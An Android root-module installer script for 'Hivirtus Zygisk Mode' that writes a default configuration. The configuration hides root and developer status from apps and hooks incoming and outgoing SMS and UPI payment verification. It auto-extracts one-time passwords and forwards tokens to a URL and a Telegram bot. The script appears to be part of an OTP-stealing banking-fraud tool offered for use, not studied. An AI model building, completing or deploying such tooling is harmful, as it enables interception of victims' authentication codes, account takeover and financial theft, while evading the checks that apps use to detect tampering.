#!/system/bin/sh
# Hivirtus Zygisk Mode — Magisk / KernelSU / APatch / SukiSU installer

SKIPUNZIP=1

ui_print "*******************************"
ui_print "   Hivirtus Zygisk Mode v2.9.4  "
ui_print "*******************************"

if [ -z "$MODPATH" ]; then
  ui_print "! ERROR: MODPATH not set"
  abort "Installation failed"
fi

ui_print "- Extracting module files..."

unzip -o "$ZIPFILE" 'module.prop' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'config.json' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'post-fs-data.sh' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'service.sh' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'customize.sh' -d "$MODPATH" >&2
unzip -o "$ZIPFILE" 'zygisk/*' -d "$MODPATH" >&2

set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
set_perm "$MODPATH/service.sh" 0 0 0755
set_perm "$MODPATH/customize.sh" 0 0 0755
set_perm "$MODPATH/config.json" 0 0 0644

if [ ! -f "$MODPATH/zygisk/arm64-v8a.so" ] && [ ! -f "$MODPATH/zygisk/armeabi-v7a.so" ]; then
  ui_print "! WARNING: No Zygisk native libs found in zip"
  ui_print "! Make sure Zygisk is enabled in root manager"
fi

if [ ! -f "$MODPATH/config.json" ]; then
  ui_print "- Creating default config"
  cat > "$MODPATH/config.json" << 'EOF'
{
  "hide_root": true,
  "hide_developer": true,
  "hide_magisk": true,
  "hide_kernelsu": true,
  "hide_apatch": true,
  "hide_sukisu": true,
  "hide_all_root_apps": true,
  "enable_sim1_mock": false,
  "enable_sim2_mock": false,
  "mock_country_iso": "in",
  "hook_incoming_sms": true,
  "hook_outgoing_sms": true,
  "hook_upi_verification": true,
  "auto_extract_otp": true,
  "auto_forward_token": true,
  "forward_url": "",
  "telegram_chat_id": "",
  "telegram_bot_token": "",
  "log_file": "/data/local/tmp/hivirtus_zygisk_mode.log"
}
EOF
fi

# Detect root manager
if [ -d /data/adb/ksu ] || [ -f /dev/kernelsu ]; then
  ui_print "- KernelSU / KSU Next detected"
elif [ -f /data/adb/magisk.db ]; then
  ui_print "- Magisk detected"
elif [ -d /data/adb/apatch ]; then
  ui_print "- APatch detected"
fi

ui_print "- Module installed: $MODPATH"
ui_print "- Enable Zygisk in root settings"
ui_print "- Reboot to activate"
